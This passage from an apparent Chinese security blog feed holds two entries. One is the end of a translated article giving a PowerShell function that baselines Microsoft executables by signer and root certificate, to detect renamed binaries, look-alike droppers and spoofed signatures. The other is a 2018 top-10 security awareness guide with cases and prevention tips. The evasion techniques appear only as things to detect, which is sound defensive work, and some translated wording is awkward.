class="string">"^$([Regex]::Escape(<span class="variable">$Env:LOCALAPPDATA</span>))"</span>, <span class="string">'%LOCALAPPDATA%'</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$OriginalFilename</span> = <span class="variable">$FileVersionInfo</span>.OriginalFilename</span><br><span class="line">        <span class="variable">$FileDescription</span> = <span class="variable">$FileVersionInfo</span>.FileDescription</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Note that Get-AuthenticodeSignature will prefer catalog signatures over embedded Authenticode signatures.</span></span><br><span class="line">        <span class="variable">$SignatureInfo</span> = <span class="built_in">Get-AuthenticodeSignature</span> <span class="variable">$Path</span></span><br><span class="line">        <span class="variable">$SigningStatus</span> = <span class="variable">$SignatureInfo</span>.Status</span><br><span class="line">        <span class="variable">$OSBinary</span> = <span class="variable">$SignatureInfo</span>.IsOSBinary</span><br><span class="line"></span><br><span class="line">        <span class="variable">$SignerThumbprint</span> = <span class="literal">$null</span></span><br><span class="line">        <span class="variable">$SignerSubject</span> = <span class="literal">$null</span></span><br><span class="line">        <span class="variable">$RootThumbprint</span> = <span class="literal">$null</span></span><br><span class="line">        <span class="variable">$RootSubject</span> = <span class="literal">$null</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$SignatureInfo</span>.SignerCertificate) &#123;</span><br><span class="line">            <span class="variable">$SignerCertificate</span> = <span class="variable">$SignatureInfo</span>.SignerCertificate</span><br><span class="line">            <span class="comment"># These will be subject to change as the certificate approaches the end of its validity period</span></span><br><span class="line">            <span class="variable">$SignerThumbprint</span> = <span class="variable">$SignerCertificate</span>.Thumbprint</span><br><span class="line">            <span class="variable">$SignerSubject</span> = <span class="variable">$SignerCertificate</span>.Subject</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Build a signer chain so the root certificate info can be extracted.</span></span><br><span class="line">            <span class="variable">$SignerChain</span> = <span class="built_in">New-Object</span> -TypeName Security.Cryptography.X509Certificates.X509Chain</span><br><span class="line">            <span class="literal">$null</span> = <span class="variable">$SignerChain</span>.Build(<span class="variable">$SignerCertificate</span>)</span><br><span class="line"></span><br><span class="line">            <span class="variable">$RootCertificate</span> = <span class="variable">$SignerChain</span>.ChainElements[<span class="variable">$SignerChain</span>.ChainElements.Count - <span class="number">1</span>].Certificate</span><br><span class="line">            <span class="variable">$RootThumbprint</span> = <span class="variable">$RootCertificate</span>.Thumbprint</span><br><span class="line">            <span class="variable">$RootSubject</span> = <span class="variable">$RootCertificate</span>.Subject</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [PSCustomObject] @&#123;</span><br><span class="line">            ExpectedPath = <span class="variable">$ExpectedPath</span></span><br><span class="line">            ExpectedFileName = <span class="variable">$FileInfo</span>.Name</span><br><span class="line">            OriginalFileName = <span class="variable">$OriginalFilename</span></span><br><span class="line">            FileDescription = <span class="variable">$FileDescription</span></span><br><span class="line">            SigningStatus = <span class="variable">$SigningStatus</span></span><br><span class="line">            IsOSBinary = <span class="variable">$OSBinary</span></span><br><span class="line">            SignerSubject = <span class="variable">$SignerSubject</span></span><br><span class="line">            SignerThumbprint = <span class="variable">$SignerThumbprint</span></span><br><span class="line">            RootSubject = <span class="variable">$RootSubject</span></span><br><span class="line">            RootThumbprint = <span class="variable">$RootThumbprint</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><img src="/Security/Microsoft可执行文件是怎么成为Microsoft可执行文件的/Get-PEFeature函数的示例输出.png" title="[Get-PEFeature函数的示例输出]"><p>　　这些属性共同构成良性Microsoft可执行文件的属性，在许多情况下，这些属性的任何偏差都应被视为可疑。请注意，“ExpectedPath”可能是最容易误报的假性财产。</p><h3 id="基线结果的应用"><a href="#基线结果的应用" class="headerlink" title="基线结果的应用"></a>基线结果的应用</h3><p>　　假设您收集了良性Microsoft PE属性的基线，让我们对前面介绍的规避攻击情形应用一些检测：</p><h4 id="1-一个签名的，可滥用的EXE被复制到另一个目录，重命名为良好的声音文件名并执行以逃避天真的命令行检测。"><a href="#1-一个签名的，可滥用的EXE被复制到另一个目录，重命名为良好的声音文件名并执行以逃避天真的命令行检测。" class="headerlink" title="1.一个签名的，可滥用的EXE被复制到另一个目录，重命名为良好的声音文件名并执行以逃避天真的命令行检测。"></a>1.一个签名的，可滥用的EXE被复制到另一个目录，重命名为良好的声音文件名并执行以逃避天真的命令行检测。</h4><p>　　已经为“预期的PowerShell”建立了定义，powershell.exe应该具有以下特征：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ExpectedPath     : %windir%\System32\WindowsPowerShell\v1.<span class="number">0</span></span><br><span class="line">ExpectedFileName : powershell.exe</span><br><span class="line">OriginalFileName : PowerShell.EXE.MUI</span><br><span class="line">FileDescription  : Windows PowerShell</span><br><span class="line">SigningStatus    : Valid</span><br><span class="line">IsOSBinary       : True</span><br><span class="line">SignerSubject    : CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</span><br><span class="line">SignerThumbprint : <span class="number">419</span>E77AED546A1A6CF4DC23C1F977542FE289CF7</span><br><span class="line">RootSubject      : CN=Microsoft Root Certificate Authority <span class="number">2010</span>, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</span><br><span class="line">RootThumbprint   : <span class="number">3</span>B1EFD3A66EA28B16697394703A72CA340A05BD5</span><br></pre></td></tr></table></figure></p><p>　　因此，当powershell.exe重命名为notepad.exe并从非标准目录执行时，我们怎么知道它实际上是powershell.exe而不依赖于文件散列？好吧，我们知道，因为重命名的notepad.exe将具有OriginalFileName“PowerShell.EXE.MUI”并且它将具有有效的Microsoft签名（即其完整性完整并链接到已知的Microsoft根证书）。ExpectedPath和ExpectedFileName字段都偏离了，应该生成警报。</p><h4 id="2-攻击者试图通过删除恶意可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件。"><a href="#2-攻击者试图通过删除恶意可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件。" class="headerlink" title="2.攻击者试图通过删除恶意可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件。"></a>2.攻击者试图通过删除恶意可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件。</h4><p>　　已知流行持久机制的二进制文件应基线化。假设已执行，应该预期onedrive.exe具有以下属性：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ExpectedPath     : %LOCALAPPDATA%\Microsoft\OneDrive</span><br><span class="line">ExpectedFileName : OneDrive.exe</span><br><span class="line">OriginalFileName : OneDrive.exe</span><br><span class="line">FileDescription  : Microsoft OneDrive</span><br><span class="line">SigningStatus    : Valid</span><br><span class="line">IsOSBinary       : False</span><br><span class="line">SignerSubject    : CN=Microsoft Corporation, OU=MOPR, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</span><br><span class="line">SignerThumbprint : <span class="number">5</span>EAD300DC7E4D637948ECB0ED829A072BD152E17</span><br><span class="line">RootSubject      : CN=Microsoft Root Certificate Authority, DC=microsoft, DC=com</span><br><span class="line">RootThumbprint   : CDD4EEAE6000AC7F40C3802C171E30148030C072</span><br></pre></td></tr></table></figure></p><p>　　在这种情况下，丢弃的恶意可执行文件将保留ExpectedFilePath和ExpectedFileName属性，但不保留其他属性。</p><h4 id="3-攻击者后门系统可执行文件。"><a href="#3-攻击者后门系统可执行文件。" class="headerlink" title="3.攻击者后门系统可执行文件。"></a>3.攻击者后门系统可执行文件。</h4><p>　　与前一个方案类似，后端可执行文件将保留ExpectedFilePath，ExpectedFileName和FileDescription属性，但不保留其他任何属性。</p><h4 id="4-攻击者欺骗Microsoft数字签名并使用“Microsoft”证书签署其恶意代码。"><a href="#4-攻击者欺骗Microsoft数字签名并使用“Microsoft”证书签署其恶意代码。" class="headerlink" title="4.攻击者欺骗Microsoft数字签名并使用“Microsoft”证书签署其恶意代码。"></a>4.攻击者欺骗Microsoft数字签名并使用“Microsoft”证书签署其恶意代码。</h4><p>　　如果攻击者使用看起来像Microsoft证书链的证书链对其恶意软件进行签名，则包含“Microsoft”的SignerSubject和/或RootSubject字段不应具有列入白名单的RootThumbprint值之一，应该被认为是非常可疑的。</p><h3 id="其他提议的属性"><a href="#其他提议的属性" class="headerlink" title="其他提议的属性"></a>其他提议的属性</h3><p>　　您可能考虑手动添加到基线列表的一个属性是“KnownAbused”属性，表示它是一个已知被攻击者滥用的二进制文件。这将允许您将相关的“生活在陆地上”的样式检测集中在一起。对于标记为已知滥用的二进制文件的一个很好的初始参考是监视来自Microsoft的规范WDAC黑名单规则集。</p><p>　　如果您要跟踪已知的滥用软件，您还可以考虑添加一个字段，其中包含一组命令行开关，用于给定的可执行文件，攻击者难以逃避。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>　　鉴于故意回避的交易技术的威胁，重要的是不仅要知道如何识别，例如，使powershell.exe powershell.exe成为什么，但是有一个实际的手段来做出这样的决定也很重要。并观察偏差。</p><p>　　我希望能够让您确信本文中强调的PE属性的重要性，并且如果您还没有这些属性，请将端点安全供应商光学器件请求这些属性。</p>]]></content>
    
    <summary type="html">
    
      究竟如何能够区分任意代码与源自Microsoft的代码？我敢打赌，大多数人的反应是：“如果它是由微软签署的，那么它来自微软。“
    
    </summary>
    
      <category term="Security" scheme="https://www.diyz.bid/categories/Security/"/>
    
    
      <category term="可执行文件" scheme="https://www.diyz.bid/tags/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>2018安全意识TOP-10</title>
    <link href="https://www.diyz.bid/Security/2018%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86TOP-10/"/>
    <id>https://www.diyz.bid/Security/2018安全意识TOP-10/</id>
    <published>2018-09-03T08:53:45.000Z</published>
    <updated>2018-10-11T10:12:52.861Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、安全意识TOP-10-2018"><a href="#一、安全意识TOP-10-2018" class="headerlink" title="一、安全意识TOP-10 2018"></a>一、安全意识TOP-10 2018</h3><table><thead><tr><th>TOP 10</th><th>描述</th></tr></thead><tbody><tr><td>A1-利用漏洞攻击</td><td>除拒绝服务攻击事件和后门攻击事件之外，利用信息系统配置缺陷、协议缺陷、程序缺陷等漏洞，对信息系统实施攻击的信息安全事件。</td></tr><tr><td>A2-信息泄露事件</td><td>因误操作、软硬件缺陷或电磁泄漏等因素导致信息系统中的保密、敏感、个人隐私等信息暴露于未经授权者而导致的信息安全事件。</td></tr><tr><td>A3-计算机病毒事件</td><td>蓄意制造、传播计算机病毒，或是因受到计算机病毒影响而导致的信息安全事件。</td></tr><tr><td>A4-木马事件</td><td>蓄意制造、传播特洛伊木马程序，或是因受到特洛伊木马程序影响而导致的信息安全事件。</td></tr><tr><td>A5-钓鱼事件</td><td>利用欺骗性的计算机网络技术，使用户泄漏重要信息而导致的信息安全事件。</td></tr><tr><td>A6-电信诈骗</td><td>利用各种渠道取得被害人的信任和注意，实施诈骗行为。</td></tr><tr><td>A7-网络设备监视及窃听事件</td><td>通过技术手段，利用网络监控或窃听设备，窃取用户个人隐私等而导致的信息安全事件。</td></tr><tr><td>A8-网页内嵌恶意代码事件</td><td>蓄意制造、传播网页内嵌恶意代码，或是因受到网页内嵌恶意代码影响而导致的信息安全事件。</td></tr><tr><td>A9-信息篡改事件</td><td>未经授权将信息系统中的信息更换为攻击者所提供的信息而导致的信息安全事件。</td></tr><tr><td>A10-信息丢失事件</td><td>因误操作、人为蓄意或软硬件缺陷等因素导致信息系统中的信息丢失而导致的信息安全事件。</td></tr></tbody></table><h3 id="二、利用漏洞攻击事件"><a href="#二、利用漏洞攻击事件" class="headerlink" title="二、利用漏洞攻击事件"></a>二、利用漏洞攻击事件</h3><p>　　利用漏洞攻击事件是指除拒绝服务攻击事件和后门攻击事件之外，利用信息系统配置缺陷、协议缺陷、程序缺陷等漏洞，对信息系统实施攻击的信息安全事件。<br>　　利用漏洞攻击事件属于网络攻击事件的一种。网络攻击事件是指通过网络或其他技术手段，利用信息系统的配置缺陷、协议缺陷、程序缺陷或使用暴力攻击对信息系统实施攻击，并造成信息系统异常或对信息系统当前运行造成潜在危害的安全事件。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：数据泄露、损坏</li><li>未授权访问</li><li>植入病毒木马</li></ul><p><strong>案例：</strong></p><ul><li><p>支付宝一键克隆<br>腾讯玄武安全实验室揭露了“应用克隆”漏洞；此漏洞广泛影响安卓系统的手机软件，例如支付宝，用户只要点击短信链接或扫描二维码就可能被克隆，造成财产损失和信息泄露</p></li><li><p>噩梦公式二代<br>黑客利用Office 内在的功能（公式编辑器）发起的攻击(“噩梦公式二代”)，打开恶意文档就会中招。此漏洞会趁着用户没打补丁的空挡，在你不知情的情况下控制你的电脑。</p></li><li><p>“WannaCry”勒索病毒<br>“WannaCry”勒索病毒攻击爆发，国内外多所高校及企业因为漏洞较多，遭遇勒索软件入侵，导致大量电脑文件被加密，被迫支付赎金或无法再使用。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>安装杀毒软件</li><li>安装防火墙</li><li>及时更新电脑的系统补丁</li><li>养成不用电脑时关闭联网的习惯</li></ul><h3 id="三、信息泄露事件"><a href="#三、信息泄露事件" class="headerlink" title="三、信息泄露事件"></a>三、信息泄露事件</h3><p>信息泄露事件是指因误操作、软硬件缺陷或电磁泄漏等因素导致信息系统中的保密、敏感、个人隐私等信息暴露于未经授权者而导致的信息安全事件。<br>信息泄露事件常见于网络个人信息泄露，包括基本信息、设备信息、账户信息、隐私信息、社会关系信息和网络行为信息等。不法人员利用恶意程序、各类钓鱼和黑客攻击非法获取个人信息，谋取利益。大规模信息泄露事件频发。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：个人信息的泄露、人身威胁、财产损失</li></ul><p><strong>案例：</strong></p><ul><li><p>“晒”机票泄露个人信息<br>朋友圈晒机票有风险。只要将你的条形码上传至免费解码网，就能知道你姓名和旅程所有信息，并可能导致后面的退票诈骗及其他信息泄露导致的财产损失。</p></li><li><p>滴滴顺风车乘客信息泄露<br>空姐在郑州航空港区乘坐滴滴顺风车遇害一案引发社会广泛关注。乘客个人信息泄露，造成严重后果。</p></li><li><p>二维码泄露被复制<br>微商赵女士在网络交易过程中，不法分子以自己支付宝余额不足为借口，提出让赵女士将付款码发给自己扫码付款。收到付款码截图后，不法分子随即进行复制，盗刷了赵女士的银行账户。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>不在非官方网站填写个人敏感信息</li><li>微信和QQ不加不明身份的好友</li><li>不轻易连接公共场所提供的Wi-Fi以及免费Wi-Fi</li><li>连接不安全的Wi-Fi时不填写任何密码以及敏感信息</li><li>处理照片、车票、快递单等包含个人信息的资料时，一定要遮蔽姓名、卡号和条形码</li></ul><h3 id="四、计算机病毒事件"><a href="#四、计算机病毒事件" class="headerlink" title="四、计算机病毒事件"></a>四、计算机病毒事件</h3><p>　　计算机病毒事件是指蓄意制造、传播计算机病毒，或是因受到计算机病毒影响而导致的信息安全事件。<br>计算机病毒是一个程序、一段可执行代码，类似于生物病毒，具有隐蔽性、感染性、潜伏性、可激发性、破坏性。它们能自身附着在各类文件上，当文件被复制或从一个用户传送到另一个用户时，它们就随同文件一起蔓延开来。随着智能电子设备的使用，影响范围越来越广。计算机病毒已不再局限于传统的台式机和笔记本电脑，移动终端同样也会遭受病毒破坏。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：引起终端设备故障、破坏数据、远程操控、个人信息的泄露、未授权的访问、财产损失等。</li></ul><p><strong>案例：</strong></p><ul><li><p>“锁机病毒”勒索钱财<br>锁机生成器病毒，仿冒各类软件诱导用户安装，锁定手机并勒索用户钱财。</p></li><li><p>“短信拦截马”窃取隐私<br>“短信拦截马”这个病毒活跃在各大Android平台上，以窃取用户隐私为目的，通过拦截并监视短信，利用盗取的用户信息盗刷银行账户、偷取用户财产。</p></li><li><p>“短信拦截马”窃取隐私<br>手机突然收到大量扣费短信息。这是用户手机下载了暗扣类应用（俗称“变脸窃贼”）所致，表面上所需权限正常，其实内含使手机付费接受短信等有害权限。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>安装杀毒软件以及防火墙</li><li>定期对计算机或终端设备进行扫描并及时更新杀毒软件的补丁</li><li>使用正版软件，不随意从非官方渠道下载软件或APP（尤其是“破解版“）</li><li>不上不熟悉且引发安全告警的网站</li><li>从非官方网页安装软件或APP时注意核对文件信息</li><li>不轻易点击收到的邮件链接及附件</li></ul><h3 id="五、木马事件"><a href="#五、木马事件" class="headerlink" title="五、木马事件"></a>五、木马事件</h3><p>　　木马事件是指蓄意制造、传播特洛伊木马程序，或是因受到特洛伊木马程序影响而导致的信息安全事件。<br>木马程序通常通过一段特定的程序（木马程序）来控制另一台计算机，打开一个或几个端口，攻击者利用这些打开的端口进入电脑系统。隐蔽性是木马的首要特点，木马程序发展到今天，对用户的威胁越来越大，使普通用户很难在中毒后发觉。一旦被木马控制，电脑或智能设备将毫无秘密可言。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：远程监控、危害本机信息安全（盗取QQ帐号、游戏帐号甚至银行帐号），将本机作为工具来攻击其他设备等。</li></ul><p><strong>案例：</strong></p><ul><li><p>公共充电桩易藏木马<br>.15晚会上，安全专家曾把藏身于免费充电桩中的木马病毒揪了出来。通过实验得知，通过使用公共充电桩给手机充电，黑客可控制手机，实现手机中的照片查看、短信发送、窃取手机使用者的验证码，甚至进行消费。</p></li><li><p>短信链接藏木马，银行卡被盗<br>市民王女士取钱时，发现这张一直锁在家中的银行卡里只剩十多块钱，另外16万元存款莫名消失。原来，王女士的手机曾收到过一条名为“老同学照片”的短信链接，手机中了木马，导致存款被盗。</p></li><li><p>QQ营销病毒，强行添加好友<br>QQ营销病毒传播感染量高达约15万余台。感染用户电脑后会强行添加QQ好友、QQ群，邀请好友加群并自动发邮件给QQ营销号。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>安装杀毒软件以及防火墙</li><li>定期对电脑进行扫描并及时更新杀毒软件的补丁</li><li>使用正版软件，不随意从非官方渠道下载应用或APP（尤其是“破解版“）</li><li>不上不熟悉且引发安全告警的网站</li><li>从非官方网页安装APP时注意核对文件信息</li><li>不轻易点击收到的邮件链接及附件</li></ul><h3 id="六、钓鱼事件"><a href="#六、钓鱼事件" class="headerlink" title="六、钓鱼事件"></a>六、钓鱼事件</h3><p>　　钓鱼事件是指利用欺骗性的计算机网络技术，使用户泄漏重要信息而导致的信息安全事件。<br>最典型的网络钓鱼攻击通过将收信人引诱到一个通过精心设计与目标组织的网站非常相似的钓鱼网站上，并获取收信人在此网站上输入的个人敏感信息，通常这个攻击过程不会让受害者警觉，并利用这些获取不正当利益。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：信息泄露、经济损失等。</li></ul><p><strong>案例：</strong></p><ul><li><p>邮件钓鱼，被骗汇款<br>西安一外贸公司收到”伪造邮件”，由于没有对收来的邮件进行辨别，向国外供货商汇款，被骗了40多万元。</p></li><li><p>点“微信红包”手机中毒<br>多位网友遭遇了疑似“微信红包”骗钱的事，点开“微信红包”后不但没有领到钱，手机反而中了“木马病毒”导致账户内的钱被转走。</p></li><li><p>Wi-Fi钓鱼，银行账户被盗<br>株洲市张女士，在一家商场内发现一个没设密码的Wi-Fi。连接Wi-Fi后，通过手机银行支付方式在淘宝上购买了衣服。随后，手机连续收到短信提醒，其信用卡被盗刷4笔，总金额高达8000多元。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>不轻易点击不认识的人或公司发来的邮件链接，在点开的网页上不轻易输入用户名和密码</li><li>输入前检查网站名是否正确；比如说<a href="http://www.mail.qq.com和www.mail.qq.cn" target="_blank" rel="noopener">www.mail.qq.com和www.mail.qq.cn</a></li><li>上官方及受信任的网站（网站名前有https字样），注意浏览器的安全提醒</li><li>不轻易扫描各种二维码</li></ul><h3 id="七、电信诈骗"><a href="#七、电信诈骗" class="headerlink" title="七、电信诈骗"></a>七、电信诈骗</h3><p>　　电信诈骗是指利用各种渠道取得被害人的信任和注意，实施诈骗行为。<br>电信诈骗即是虚假信息诈骗，借助于手机、固定电话、网络等通信工具和现代的技术等实施的非接触式的诈骗犯罪。随着网络的发展，可以说是迅速地发展蔓延，给人民群众造成了很大的损失。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：财产经济损失、人身伤害等。</li></ul><p><strong>案例：</strong></p><ul><li><p>伪装政府机关诈骗<br>贸易委员会发现了多起伪装成中国大使馆的诈骗电话。犯罪分子伪装成中国大使馆诈骗250万美元。</p></li><li><p>二维码诈骗<br>李先生收到一条某电商网站的推销短信，通过手机扫描了店主发来的二维码后，进入一个支付界面，输入银行账号和密码后却显示支付失败，之后却发现自己的银行账号被转走10000余元。</p></li><li><p>假账号诈骗<br>徐玉玉电信诈骗案：诈骗团伙以发放助学金的名义，让徐玉玉转账激活卡片，盗取了9900元学费，最终导致徐玉玉心脏骤停而离世。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>不要相信任何在电话里提到的公检法部门的侦查、汇款；不要相信网络或传真的“法院传票”</li><li>不要轻易扫描他人的付款二维码需要输入密码账号时，仔细核对支付页面</li><li>在电话中提及转账、汇款、罚款等说法时，一定要通过官网渠道进行二次确认</li><li>不要随便相信中奖信息，尤其是先交“个人所得税”、“公证费”、“转账手续费”等中奖信息</li></ul><h3 id="八、网络设备监视及窃听事件"><a href="#八、网络设备监视及窃听事件" class="headerlink" title="八、网络设备监视及窃听事件"></a>八、网络设备监视及窃听事件</h3><p>　　网络设备监视及窃听事件是指利用网络监控或窃听设备，获取设备控制权从而窃取用户个人隐私等而导致的信息安全事件。<br>网络设备监视及窃听事件主要涉及侵犯个人隐私，利用摄像头为代表的物联网设备对政府、企业、个人进行信息窃取。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：个人隐私泄露，财产损失、人格利益受损及精神痛苦等。</li></ul><p><strong>案例：</strong></p><ul><li><p>麦克风窃听<br>攻击者首先向目标发送钓鱼邮件，恶意程序隐藏Microsoft Word 文档中，一旦感染目标之后利用恶意程序控制设备的麦克风去记录对话、屏幕截图、文档和密码。</p></li><li><p>监控摄像头直播<br>某视频直播网站引发热议，在该网站上可以看到全国各地甚至国外的监控摄像头的免费直播，包括街景、餐厅、商店、办公室，甚至市民家中情况。</p></li><li><p>手机摄像头拍照<br>vivo NEX手机开卖，“隐藏式升降式摄像头”引热议。在QQ浏览器中打开携程网站（APP权限开启），vivoNEX的前置摄像头突然自动升了起来，然后默默“扫描”了一眼再缩回去。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>不用摄像头的时候，盖住摄像头</li><li>不在摄像头范围内，泄露账户密码等隐私信息</li><li>定期对电脑进行扫描并及时更新杀毒软件的补丁</li></ul><h3 id="九、网页内嵌恶意代码事件"><a href="#九、网页内嵌恶意代码事件" class="headerlink" title="九、网页内嵌恶意代码事件"></a>九、网页内嵌恶意代码事件</h3><p>　　网页内嵌恶意代码事件是指蓄意制造、传播网页内嵌恶意代码，或是因受到网页内嵌恶意代码影响而导致的信息安全事件。<br>网页恶意代码(又称“网页病毒”)是利用网页来进行破坏的病毒。当用户登录某些含有网页病毒的网站时，网页病毒便被悄悄激活，这些病毒一旦激活，可以利用系统的一些资源进行破坏。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：IE默认搜索引擎被修改、系统启动时弹出广告信息、营销诈骗、信息泄露。</li></ul><p><strong>案例：</strong></p><ul><li><p>知名网站的广告被“挂马攻击”<br>国内多家知名软件、网站的广告页面遭到病毒团伙的“挂马攻击”只要用户访问该页面，即会触发浏览器漏洞。</p></li><li><p>恶意代码注入合法网站<br>Websense安全实验室监测到一场大规模恶意代码注入攻击正在不断袭击合法网站，已经有上万个合法网站受到攻击，无数的Web用户受到感染。</p></li><li><p>网站感染按键记录器<br>WordPress 网站感染了按键记录器。恶意程序会记录密码，以及管理员或访客输入的任何内容。恶意程序除了安装按键记录器还，还安装了挖矿脚本，利用访客的计算机挖掘数字货币。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>安装杀毒软件以及防火墙</li><li>定期对电脑进行扫描并及时更新杀毒软件的补丁</li><li>不上不熟悉以及引发安全警报的网站</li></ul><h3 id="十、信息篡改事件"><a href="#十、信息篡改事件" class="headerlink" title="十、信息篡改事件"></a>十、信息篡改事件</h3><p>　　信息篡改事件是指在未经授权的情况下，将信息系统中的信息更换为攻击者所提供的信息而导致的信息安全事件。<br>信息篡改事件通常体现在网页、商务数据、金融数据、个人信息等保存在数据库中的资料被人为修改，从中牟利，例如数据篡改、网页篡改等。攻击者获取受害网站权限或个人信息的方法都很常见，包括SQL注入和口令盗取，其中最常见的就是文件包含漏洞。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：访问控制失效、个人信息泄露、财产损失。</li></ul><p><strong>案例：</strong></p><ul><li><p>银行存款被篡改<br>俄罗斯一安全公司实验室介绍了他们的一些调查结果，表明一个或多个黑客群体针对至少140 家银行和组织进行了这种攻击，旨在盗取凭证和金钱。</p></li><li><p>政府网站被篡改<br>江苏警方奔赴马来西亚打掉一个由四人组成的黑客团伙，个别政府网站遭黑客非法侵入，会被链接到境外的赌博网站。</p></li><li><p>虚拟货币客户端被篡改<br>Myetherwallet（MEW）是网络上最受欢迎的以太坊钱包客户端，很不幸其在北京时间4月24日晚9点遭受DNS劫持攻击。许多用户报告缺失资金，造成经济损失。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>重要信息和有价值的资料应定期备份</li><li>不要把存款、股票等有价证券放在同一个平台</li></ul><h3 id="十一、信息丢失事件"><a href="#十一、信息丢失事件" class="headerlink" title="十一、信息丢失事件"></a>十一、信息丢失事件</h3><p>　　信息丢失事件是指因误操作、人为蓄意或软硬件缺陷等因素导致信息系统中的信息丢失而导致的信息安全事件。<br>此类事件多由于服务端被攻击或人为失误造成，会在一定程度上影响公众生活。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：财产经济损失等。</li></ul><p><strong>案例：</strong></p><ul><li><p>误操作，移动用户数据丢失<br>因华为误操作导致广西80万移动用户数据丢失一事，华为已经被中国移动处以5亿罚款，同时中国移动已经展开全国范围的系统大排查。</p></li><li><p>苹果手机读取权限漏洞<br>苹果macOS系统曾经被曝光允许任何人通过客人账户获得该设备的所有读取权限。不过好在苹果及时做出了补救措施。但事情没过多久，又有一位用户发现了类似的漏洞。</p></li><li><p>数据库被删除数据，以备份勒索<br>数据库被黑并遭勒索，犯罪分子利用数据库配置漏洞进行未授权访问、拷贝、删除数据库内容，并以备份数据威胁受害者、索要赎金。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>重要信息和有价值的资料应定期备份</li><li>定期对电脑进行扫描并及时更新杀毒软件的补丁</li></ul><h3 id="十二、措施"><a href="#十二、措施" class="headerlink" title="十二、措施"></a>十二、措施</h3><table><thead><tr><th>类别</th><th>初级措施</th><th>高级措施</th></tr></thead><tbody><tr><td>系统安装</td><td>1.安装最新版正版操作系统<br>2.启用系统防火墙<br>3.安装系统补丁<br>4.一定要设密码（用户名/密码）<br>5.安装杀毒软件，用杀毒软件做全盘扫描</td><td>1.取消非必要授权<br>2.设备自带防护等级设置为“高”</td></tr><tr><td>数据保护</td><td>1.定期备份文件<br>2.使用office的加密功能保护文档</td><td>1.多因子验证</td></tr><tr><td>正确使用密码</td><td>1.不使用已知不安全密码或常见密码<br>2.最好不要名字、生日、电话号码等<br>3.不要一个密码通用所有帐号<br>4.设置的密码一定要让自己记住</td><td>1.密码应该不少于8个字符<br>2.同时包含多种类型的字符</td></tr><tr><td>第三方软件管理</td><td>1.每种功能的软件尽量选择自己熟悉的一种安装，不要重复安装<br>2.尽量选择规模较大的软件公司出品的第三方软件<br>3.使用正版的第三方软件<br>4.发现第三方软件提示要更新时，请尽快安装</td><td>1.随时关注相关软件的官方网站，发现最新版本及时安装<br>2.确认长时间不需要使用的软件请尽快卸</td></tr><tr><td>邮件安全</td><td>1.如果你不能确认你的邮件是合法并安全的，不要发送<br>2.不要打开陌生人发来的邮件附件，也不要点击邮件中的链接<br>3.不要轻易在网站上留你的公司邮箱或重要私人邮箱<br>4.如果留取你的邮件地址不是获取服务所必需的，不要留取自己的邮件地址</td><td>1.通过邮件发送公司机密/敏感信息、个人隐私信息、或信用卡数据等，此类数据需要保护，即加密后才能发送<br>2.创建不重要的邮件帐号，用于一些网站注册和邮件列表</td></tr><tr><td>无线安全</td><td>1.区分在家登陆和公共场合的登陆<br>2.不要使用不受信的无线网络，使用公有的无线网络传输隐私信息时一定要加密传输<br>3.最好把WiFi连接设置为手动</td><td>1.如果不使用无线，带无线功能的笔记本和手机设备在工作区域应该关闭无线功能，避免攻击者通过设备的无线接入内网</td></tr><tr><td>智能终端安全</td><td>1.不要随意将移动终端连接到内部网络的设备上，哪怕仅仅是充电<br>2.不要随便安装不受信的app<br>3.不用电脑时，一定要关机<br>4.合理处置旧手机</td><td>1.移动终端上存储的隐私信息尽可能的加密存储</td></tr><tr><td>移动存储介质</td><td>1.不使用未知来源的移动存储介质<br>2.使用移动存储介质时，先进行扫描杀毒<br>3.请尽量避免